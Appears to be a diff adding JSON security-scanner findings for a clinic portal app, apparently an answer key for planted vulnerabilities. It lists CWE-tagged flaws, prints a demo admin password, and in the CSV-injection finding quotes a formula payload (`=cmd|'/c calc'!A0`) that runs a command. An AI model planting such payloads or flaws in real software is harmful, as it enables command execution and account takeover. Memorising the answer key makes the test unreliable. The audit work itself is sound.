+        "message": "attachHandoffExportHeaders inserts the client-supplied `packetLabel` query param (app/api/documents/handoff-export/route.ts:15) into the Content-Disposition header value after only trimming it \u2014 no CR/LF stripping or quote-escaping. An embedded double-quote breaks out of the filename=\"...\" attribute to inject additional Content-Disposition parameters. The sibling attachSanitizedHandoffExportHeaders (lines 60-64), used by print-label/route.ts, explicitly strips [\\r\\n] first, confirming the intended defense is missing here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.client-controlled-bcrypt-cost-factor",
+      "path": "lib/kiosk-passcode.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 13,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "registerKioskPasscode accepts a client-supplied `hashStrength` (from the request body in app/api/staff/kiosk-passcode/route.ts:12,18) and uses it directly as the bcrypt cost factor, with a default fallback of 4 if omitted \u2014 both far below the accepted minimum (10-12) for password/passcode hashing, and the caller can drive it arbitrarily low. This weakens resistance to offline brute-forcing of the shared kiosk unlock passcode if the hash is ever exfiltrated. The sibling registerTriageKioskPasscode (lines 25-32) hardcodes cost 12.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random-invite-code",
+      "path": "app/actions.ts",
+      "start": {
+        "line": 1094,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1094,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "inviteStaffMemberAction generates the staff invitation code with `Math.random().toString(36).substring(2, 15)`, which is not cryptographically secure and is predictable/reproducible given knowledge of the PRNG state or timing. The sibling resendStaffInvitationAction (lines 1115-1136) uses randomToken(20), a CSPRNG-backed token generator, for the equivalent purpose.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.logic.always-true-dme-approval",
+      "path": "lib/dme-authorization.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 33,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "`const approved = result.approved ? true : false;` \u2014 result.approved from the partner stub is always the string \"true\" or \"false\" (line 14), and both non-empty strings are truthy in JavaScript, so `approved` evaluates to `true` regardless of the partner's actual authorization decision. This silently approves durable-medical-equipment orders that the partner network intended to deny. The sibling authorizeDurableEquipmentOrderFromChart (lines 41-48) correctly checks `result.approved === true || result.approved === \"true\"`.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-697: Incorrect Comparison"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-disclosure.account-enumeration-dependent-link",
+      "path": "app/api/portal/dependent-link/route.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The catch block returns the raw DependentLinkError.message verbatim to the caller. requestDependentPortalLink (lib/portal-linking.ts) throws distinct messages such as \"No portal account found for that email\" vs \"This account cannot be linked as a dependent\", letting an authenticated patient enumerate whether an arbitrary email address has a portal account. The sibling app/api/portal/dependent-link-request/route.ts uses requestVerifiedDependentPortalLink, which normalizes the outcome to avoid this leak.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.logging.sensitive-secret-in-error-log",
+      "path": "lib/webhooks.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "On delivery failure, the full `endpoint` object \u2014 which was just used to send `endpoint.secret` in the outbound webhook body (line 17) \u2014 is dumped to the server log via console.error alongside the event and error. This persists the webhook signing secret in plaintext application logs. The sibling deliverPayerSyncEvent (lines 43-61) logs only endpointId/endpointName/eventType/message, deliberately omitting the secret.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.debug.diagnostic-header-leaks-stack-trace",
+      "path": "lib/diagnostics.ts",
+      "start": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderReportFailure returns the raw error message, full stack trace, and internal context object in the JSON response whenever the request carries `x-clinic-diagnostics` truthy, with no authorization check of its own on that header. This is reached from app/api/reports/utilization/route.ts, which (per the forged-grant finding on lib/network-access.ts) can already be accessed by an attacker with a forged partner-grant cookie, compounding the two issues into full internal error/stack disclosure.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-default-secret-fallback",
+      "path": "lib/share-links.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 4,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The AES key derivation falls back to a fixed, source-visible default (`\"clinic-share-link-default-secret\"`) whenever CLINIC_LINK_SECRET is unset, letting anyone with source access decrypt/forge visit-summary and appointment-confirmation share links in any deployment that forgot to configure the environment variable.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-1188: Insecure Default Initialization of Resource"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-default-integrity-secret",
+      "path": "lib/request-integrity.ts",
+      "start": {
+        "line": 4,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 4,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The CSRF-style state-change integrity token falls back to a fixed default (`\"clinic-local-integrity-secret\"`) when SESSION_INTEGRITY_SECRET is unset, letting anyone with source access forge valid integrity tokens in any deployment that forgot to configure the secret.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-1188: Insecure Default Initialization of Resource"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.csrf.thread-status-no-integrity-token",
+      "path": "components/thread-status-actions.tsx",
+      "start": {
+        "line": 3,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 11,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "setStatus issues a state-changing POST to /api/messages/thread-status relying solely on ambient session cookies, with no CSRF/integrity token in the body. The sibling components/quick-note-form.tsx explicitly threads an `integrityToken` (derived server-side via deriveStateChangeToken(sessionToken)) into its POST body for the same kind of fetch-based mutation, indicating the app's established anti-CSRF pattern was not applied here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.credentials.hardcoded-demo-credentials-login-page",
+      "path": "app/login/page.tsx",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The login page pre-fills and prints in plaintext a working shared password (\"PortalDemo!2026\") for every seeded account, including admin@riversideclinic.test, visible to anyone who loads /login unauthenticated. This gives any visitor working admin credentials.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-disclosure.sensitive-value-in-url-query",
+      "path": "lib/pbm-sync.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The PBM API key and patient identifier are placed in the outbound URL query string (`?apiKey=${apiKey}&member=${prescription.patientId}...`) rather than a header, making them more likely to be captured in proxy/access logs. The sibling syncClaimAdjustmentToClearinghouse (lines 37-50) sends its key via an Authorization header instead.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.csv-injection.appointment-export-formula",
+      "path": "app/api/reports/appointments/route.ts",
+      "start": {
+        "line": 17,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The patient-supplied `appointment.reason` field (validated only for length in app/actions.ts) is written into a CSV export via csvEscape (lib/format.ts:21-27), which only quotes values containing `,`/`\"`/`\\n` and does not neutralize a leading `=`, `+`, `-`, or `@`. A patient-entered appointment reason like `=cmd|'/c calc'!A0` lands unmodified in the exported CSV and can trigger formula execution if a CLINIC_ADMIN opens it in a vulnerable spreadsheet application.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1236: Improper Neutralization of Formula Elements in a CSV File"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secrets.seed-script-demo-credentials",
+      "path": "prisma/seed.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "A single shared demo password (\"PortalDemo!2026\") is applied to every seeded account (admin, clinicians, front desk, all patients). Expected for a demo/seed script, but if this seed is ever run against a non-throwaway environment reachable externally, every account shares one well-known password.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
